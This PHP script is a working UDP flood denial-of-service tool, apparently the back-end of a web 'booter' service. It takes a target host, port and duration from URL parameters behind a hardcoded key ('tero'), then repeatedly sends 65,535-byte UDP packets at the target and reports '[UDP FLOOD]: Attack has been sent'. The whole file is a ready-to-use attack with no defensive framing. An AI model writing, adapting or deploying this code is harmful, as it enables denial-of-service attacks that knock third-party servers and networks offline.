<?php
# [+] List of variables
$apikey = $_GET['apikey'];
$host   = $_GET['host'];
$port   = $_GET['port'];
$execTM = $_GET['time'];
$method = $_GET['method'];

# [+] Script Settings
$maxBT   = "3601";
$maxBTS  = "3,600 seconds.";
$key     = "tero";
$time    = time();
$maxTM   = $time + $execTM;
$packets = 0;
set_time_limit(0);
ignore_user_abort(FALSE);

# [+] Checking API Key
if ($apikey == null) {
    ob_end_clean();
    echo 'Enter your API Key.';
} else {
}

# [+] Let's begin
if ($apikey == $key) {
    if ($host == null) {
        echo "Invalid Format: Enter a host.<br/>Example usage: ?api=tero&host=127.0.0.1&port=80&time=10";
    } else {
        if ($port == null) {
            echo "Invalid Format: Enter a port.<br/>Example usage: ?api=tero&host=127.0.0.1&port=80&time=10";
        } else {
            if ($time == null) {
                echo "Invalid Format: Enter boot time.<br/>Example usage: ?api=tero&host=127.0.0.1&port=80&time=10";
            } else {
                if ($execTM >= $maxBT) {
                    echo 'Your max boot time is ' . $maxBTS . '';
                } else {
                    for ($i = 0; $i < 65535; $i++) {
                        $out .= "X";
                    }
                    while (1) {
                        $packets++;
                        if (time() > $maxTM) {
                            break;
                        }
                        # [+] Here is the action
                        $fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);
                        if ($fp) {
                            fwrite($fp, $out);
                            fclose($fp);
                        }
                    }
                    echo '[UDP FLOOD]: Attack has been sent to ' . $host . ' for ' . $execTM . ' second(s).';
                }
            }
        }
    }
} else {
    echo 'Invalid API Key';
}
?>
